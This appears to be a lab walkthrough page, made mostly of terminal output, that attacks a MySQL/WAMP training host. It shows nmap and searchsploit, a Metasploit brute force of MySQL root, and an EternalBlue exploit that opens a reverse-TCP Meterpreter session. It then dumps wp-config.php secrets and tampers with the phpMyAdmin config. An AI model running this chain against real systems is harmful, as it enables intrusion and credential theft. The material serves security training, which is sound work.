# Targeting MySQL Database Server

```sh
root@attackdefense:~# nmap -sV -sC -p 3306,8585 10.5.19.216
Starting Nmap 7.92 ( https://nmap.org ) at 2024-01-14 19:39 IST
Nmap scan report for demo.ine.local (10.5.25.248)
Host is up (0.0022s latency).

PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 5.5.20-log
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.20-log
|   Thread ID: 6
|   Capabilities flags: 63487
|   Some Capabilities: IgnoreSigpipes, SupportsLoadDataLocal, Support41Auth, ODBCClient, SupportsTransactions, SupportsCompression, ConnectWithDatabase, DontAllowDatabaseTableColumn, InteractiveClient, LongColumnFlag, LongPassword, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, FoundRows, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: YG7{+`#-VJR;n=%>J:%E
|_  Auth Plugin Name: mysql_native_password
8585/tcp open  http    Apache httpd 2.2.21 ((Win64) PHP/5.3.10 DAV/2)
|_http-title: WAMPSERVER Homepage
|_http-server-header: Apache/2.2.21 (Win64) PHP/5.3.10 DAV/2

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.75 seconds



root@attackdefense:~# searchsploit mysql 5.5
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
MySQL / MariaDB / PerconaDB 5.5.51/5.6.32/5.7.14 - Code Execution / Privilege Escalation                                                                                                                 | linux/local/40360.py
MySQL / MariaDB / PerconaDB 5.5.x/5.6.x/5.7.x - 'mysql' System User Privilege Escalation / Race Condition                                                                                                | linux/local/40678.c
MySQL / MariaDB / PerconaDB 5.5.x/5.6.x/5.7.x - 'root' System User Privilege Escalation                                                                                                                  | linux/local/40679.sh
MySQL 5.1/5.5 (Windows) - 'MySQLJackpot' Remote Command Execution                                                                                                                                        | windows/remote/23073.txt
MySQL 5.5.45 (x64) - Local Credentials Disclosure                                                                                                                                                        | windows_x86-64/local/40337.py
MySQL 5.5.45 - procedure analyse Function Denial of Service                                                                                                                                              | multiple/dos/39867.py
MySQL 5.5.8 - Remote Denial of Service                                                                                                                                                                   | windows/dos/18269.py
MySQL < 5.6.35 / < 5.7.17 - Integer Overflow                                                                                                                                                             | multiple/dos/41954.py
MySQL Eventum 1.5.5 - 'login.php' SQL Injection                                                                                                                                                          | php/webapps/1134.pl
MySQL Quick Admin 1.5.5 - 'cookie' Local File Inclusion                                                                                                                                                  | php/webapps/6641.txt
MySQL Quick Admin 1.5.5 - Local File Inclusion                                                                                                                                                           | php/webapps/7020.txt
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

```sh
msf6 > search mysql_login

Matching Modules
================

   #  Name                                 Disclosure Date  Rank    Check  Description
   -  ----                                 ---------------  ----    -----  -----------
   0  auxiliary/scanner/mysql/mysql_login                   normal  No     MySQL Login Utility


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/mysql/mysql_login

msf6 > use 0
msf6 auxiliary(scanner/mysql/mysql_login) > set RHOSTS 10.5.19.216
RHOSTS => 10.5.25.248
msf6 auxiliary(scanner/mysql/mysql_login) > set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
PASS_FILE => /usr/share/wordlists/metasploit/unix_passwords.txt
msf6 auxiliary(scanner/mysql/mysql_login) > run

[+] 10.5.25.248:3306      - 10.5.25.248:3306 - Found remote MySQL version 5.5.20
[!] 10.5.25.248:3306      - No active DB -- Credential data will not be saved!
[+] 10.5.25.248:3306      - 10.5.25.248:3306 - Success: 'root:'
[*] 10.5.25.248:3306      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```sh
root@attackdefense:~# mysql -u root -p -h 10.5.19.216
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 16
Server version: 5.5.20-log MySQL Community Server (GPL)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| cards              |
| mysql              |
| performance_schema |
| test               |
| wordpress          |
+--------------------+
6 rows in set (0.007 sec)

MySQL [(none)]> 
```

<figure><img src="../../.gitbook/assets/Screenshot from 2024-01-14 19-56-32.png" alt=""><figcaption></figcaption></figure>

```sh
msf6 > search eternalblue

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce

msf6 > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 
[-] Unknown variable
Usage: set [option] [value]

Set the given option to value.  If value is omitted, print the current value.
If both are omitted, print options that are currently set.

If run from a module context, this will set the value in the module's
datastore.  Use -g to operate on the global datastore.

If setting a PAYLOAD, this command can take an index from `show payloads'.

msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.5.19.216
rhosts => 10.5.19.216
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.10.26.4:4444 
[*] 10.5.19.216:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.5.19.216:445       - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (64-bit)
[*] 10.5.19.216:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.5.19.216:445 - The target is vulnerable.
[*] 10.5.19.216:445 - Connecting to target for exploitation.
[+] 10.5.19.216:445 - Connection established for exploitation.
[+] 10.5.19.216:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.5.19.216:445 - CORE raw buffer dump (51 bytes)
[*] 10.5.19.216:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
[*] 10.5.19.216:445 - 0x00000010  30 30 38 20 52 32 20 53 74 61 6e 64 61 72 64 20  008 R2 Standard 
[*] 10.5.19.216:445 - 0x00000020  37 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63  7601 Service Pac
[*] 10.5.19.216:445 - 0x00000030  6b 20 31                                         k 1             
[+] 10.5.19.216:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.5.19.216:445 - Trying exploit with 12 Groom Allocations.
[*] 10.5.19.216:445 - Sending all but last fragment of exploit packet
[*] 10.5.19.216:445 - Starting non-paged pool grooming
[+] 10.5.19.216:445 - Sending SMBv2 buffers                                                                                                                                                 
[+] 10.5.19.216:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.                                                                                                 
[*] 10.5.19.216:445 - Sending final SMBv2 buffers.                                                                                                                                          
[*] 10.5.19.216:445 - Sending last fragment of exploit packet!                                                                                                                              
[*] 10.5.19.216:445 - Receiving response from exploit packet                                                                                                                                                     
[+] 10.5.19.216:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!                                                                                                                                 
[*] 10.5.19.216:445 - Sending egg to corrupted connection.                                                                                                                                                                                 
[*] 10.5.19.216:445 - Triggering free of corrupted buffer.                                                                                                                                                                                 
[*] Sending stage (200262 bytes) to 10.5.19.216                                                                                                                                                                                            
[+] 10.5.19.216:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=                                                                                                                                                                                          
[+] 10.5.19.216:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=                                                                                                                                                                                          
[+] 10.5.19.216:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=                                                                                                                                                                                          
[*] Meterpreter session 1 opened (10.10.26.4:4444 -> 10.5.19.216:49280 ) at 2024-01-14 19:58:14 +0530                                                                                                                                                                        
                                                                                                                                                                                                                                                                             
meterpreter > sysinfo                                                                                                                                                                                                                                                        
Computer        : VAGRANT-2008R2                                                                                                                                                                                                                                             
OS              : Windows 2008 R2 (6.1 Build 7601, Service Pack 1).                                                                                                                                                                                                          
Architecture    : x64                                                                                                                                                                                                                                                        
System Language : en_US                                                                                                                                                                                                                                                      
Domain          : WORKGROUP                                                                                                                                                                                                                                                                                                                                                              
Logged On Users : 1          
Meterpreter     : x64/windows                                                                                                                                                                                                                                                                                                                                                                                            
```

<pre class="language-sh"><code class="lang-sh">meterpreter > cd /
meterpreter > ls
Listing: C:\
============

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040777/rwxrwxrwx  0       dir   2009-07-14 08:04:39 +0530  $Recycle.Bin
100444/r--r--r--  8192    fil   2021-10-28 21:41:09 +0530  BOOTSECT.BAK
040777/rwxrwxrwx  4096    dir   2021-10-28 21:41:09 +0530  Boot
040777/rwxrwxrwx  0       dir   2009-07-14 10:36:44 +0530  Documents and Settings
040777/rwxrwxrwx  0       dir   2009-07-14 08:50:08 +0530  PerfLogs
040555/r-xr-xr-x  4096    dir   2021-11-02 00:14:05 +0530  Program Files
040555/r-xr-xr-x  4096    dir   2021-10-28 19:54:25 +0530  Program Files (x86)
040777/rwxrwxrwx  4096    dir   2021-11-02 00:20:44 +0530  ProgramData
040777/rwxrwxrwx  0       dir   2021-10-28 20:42:46 +0530  Recovery
040777/rwxrwxrwx  0       dir   2021-10-28 20:01:16 +0530  RubyDevKit
040777/rwxrwxrwx  4096    dir   2021-10-28 20:41:52 +0530  System Volume Information
040555/r-xr-xr-x  4096    dir   2021-10-28 19:52:30 +0530  Users
040777/rwxrwxrwx  16384   dir   2021-11-02 00:21:12 +0530  Windows
100444/r--r--r--  383786  fil   2010-11-21 08:54:02 +0530  bootmgr
040777/rwxrwxrwx  0       dir   2021-10-28 19:58:42 +0530  glassfish
040777/rwxrwxrwx  0       dir   2021-10-28 19:52:09 +0530  inetpub
100666/rw-rw-rw-  0       fil   2021-10-28 20:08:20 +0530  jack_of_diamonds.png
040777/rwxrwxrwx  0       dir   2021-10-28 20:00:42 +0530  openjdk6
000000/---------  0       fif   1970-01-01 05:30:00 +0530  pagefile.sys
040777/rwxrwxrwx  0       dir   2021-10-28 20:08:24 +0530  startup
040777/rwxrwxrwx  0       dir   2021-10-28 20:00:57 +0530  tools
<strong>040777/rwxrwxrwx  4096    dir   2021-10-28 20:00:10 +0530  wamp
</strong>


meterpreter > cd wamp
meterpreter > ls
Listing: C:\wamp
================

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
040777/rwxrwxrwx  4096     dir   2021-10-28 20:07:14 +0530  alias
040777/rwxrwxrwx  0        dir   2021-10-28 20:00:05 +0530  apps
100666/rw-rw-rw-  4790     fil   2010-12-31 21:09:42 +0530  barimage.bmp
040777/rwxrwxrwx  0        dir   2021-10-28 20:00:08 +0530  bin
100666/rw-rw-rw-  16054    fil   2011-01-04 01:19:34 +0530  images_off.bmp
100666/rw-rw-rw-  16054    fil   2011-01-04 01:19:34 +0530  images_on.bmp
040777/rwxrwxrwx  0        dir   2021-10-28 20:00:09 +0530  lang
100666/rw-rw-rw-  15668    fil   2010-12-31 22:56:16 +0530  license.txt
040777/rwxrwxrwx  0        dir   2021-10-28 20:00:11 +0530  logs
040777/rwxrwxrwx  0        dir   2021-10-28 20:00:09 +0530  scripts
040777/rwxrwxrwx  0        dir   2021-10-28 20:00:09 +0530  tmp
040777/rwxrwxrwx  0        dir   2021-10-28 20:00:09 +0530  tools
100666/rw-rw-rw-  182407   fil   2021-10-28 20:00:09 +0530  unins000.dat
100777/rwxrwxrwx  913246   fil   2021-10-28 20:00:04 +0530  unins000.exe
100777/rwxrwxrwx  209      fil   2021-10-28 20:00:09 +0530  uninstall_services.bat
100666/rw-rw-rw-  994      fil   2021-10-28 20:00:09 +0530  wampmanager.conf
100777/rwxrwxrwx  1169920  fil   2010-12-31 21:10:06 +0530  wampmanager.exe
100666/rw-rw-rw-  1147     fil   2021-10-28 20:00:09 +0530  wampmanager.ini
100666/rw-rw-rw-  12681    fil   2021-10-28 20:00:09 +0530  wampmanager.tpl
<strong>040777/rwxrwxrwx  4096     dir   2021-10-28 20:07:30 +0530  www
</strong>


meterpreter > cd www
meterpreter > ls
Listing: C:\wamp\www
====================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100666/rw-rw-rw-  22409  fil   2021-10-28 20:00:09 +0530  index.php
100666/rw-rw-rw-  1189   fil   2021-10-28 19:49:02 +0530  meterpreter.php
100666/rw-rw-rw-  491    fil   2021-10-28 19:49:02 +0530  mma.php
100666/rw-rw-rw-  190    fil   2010-12-31 21:10:06 +0530  testmysql.php
040777/rwxrwxrwx  0      dir   2021-10-28 20:07:14 +0530  uploads
040777/rwxrwxrwx  0      dir   2016-09-27 03:58:12 +0530  wordpress




meterpreter > cat wordpress\\wp-config.php
&#x3C;?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
<strong>define('DB_NAME', 'wordpress');
</strong>
/** MySQL database username */
<strong>define('DB_USER', 'root');
</strong>
/** MySQL database password */
<strong>define('DB_PASSWORD', '');
</strong>
/** MySQL hostname */
<strong>define('DB_HOST', 'localhost');
</strong>
/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         '@?FmT&#x26;ouV>E*ewlU/+^zSaLho=}qI`luZ5d$WNy_GU($^{@D&#x26;T:LG*)fMZjRog&#x26;{');
define('SECURE_AUTH_KEY',  'f:{OGNAj-H1Cp0h 0LC8v@wx$Z4%C)oUXpq$dC@`Qr{5/;r`t|Cy8.3N$SseLlVd');
define('LOGGED_IN_KEY',    '~RrV)Vczu}#VNiWwJq$s}[7J>gB#3GE(ZtuWm|Qea+lZ)hse~stP~.B@xYui>{%q');
define('NONCE_KEY',        'GPh]GLXqi[z&#x26;mralkItzn=H&#x26;#(Z?&#x3C;blSZ1Y7&#x3C;tcQor:z4z 2H[f{PJR0#iz v%gK');
define('AUTH_SALT',        'UMb|`KU:Eys4j)`F+svcr1@KifSy{~3}]#$dA^!?x6pe]Qfl$+!!1P)w^D}jw4=/');
define('SECURE_AUTH_SALT', 'fjGU23)|ZDGW=8ohS1~r=s:$(ff@>n>:p$+Wk@V;+J6W9&#x26;{dCu&#x26;?=ZM.k,No@PPd');
define('LOGGED_IN_SALT',   '@N.u3x$fz$%ppS*?;}t>_Xvv~iFVIC&#x3C;X%8X!VBT9~UWYORKJ#M&#x3C;G$ bG:F5Y@:c(');
define('NONCE_SALT',       ']|24lfp7Ud*.pZz?F>Ozos^!g^$IJp`0~0,(Vi+cx((ly7IUhh(m=Gx4M(h2%dWc');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
        define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
meterpreter > 






meterpreter > cd ../alias
meterpreter > ls
Listing: C:\wamp\alias
======================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  1488  fil   2021-10-28 19:48:52 +0530  httpd-dav.conf
<strong>100666/rw-rw-rw-  471   fil   2021-10-28 19:48:58 +0530  phpmyadmin.conf
</strong>100666/rw-rw-rw-  441   fil   2021-10-28 20:00:09 +0530  sqlbuddy.conf
100666/rw-rw-rw-  439   fil   2021-10-28 20:00:09 +0530  webgrind.conf

meterpreter > download phpmyadmin.conf 
[*] Downloading: phpmyadmin.conf -> /root/phpmyadmin.conf
[*] Downloaded 471.00 B of 471.00 B (100.0%): phpmyadmin.conf -> /root/phpmyadmin.conf
[*] download   : phpmyadmin.conf -> /root/phpmyadmin.conf
</code></pre>

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/Screenshot from 2024-01-14 20-13-55.png" alt=""><figcaption></figcaption></figure>

```sh
meterpreter > upload phpmyadmin.conf
[*] uploading  : /root/phpmyadmin.conf -> phpmyadmin.conf
[*] Uploaded 416.00 B of 416.00 B (100.0%): /root/phpmyadmin.conf -> phpmyadmin.conf
[*] uploaded   : /root/phpmyadmin.conf -> phpmyadmin.conf
meterpreter > shell
Process 4676 created.
Channel 4 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\wamp\alias>net stop wampapache
net stop wampapache
The wampapache service is stopping.
The wampapache service was stopped successfully.


C:\wamp\alias>net start wampapache
net start wampapache
The wampapache service is starting.
The wampapache service was started successfully.
```

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
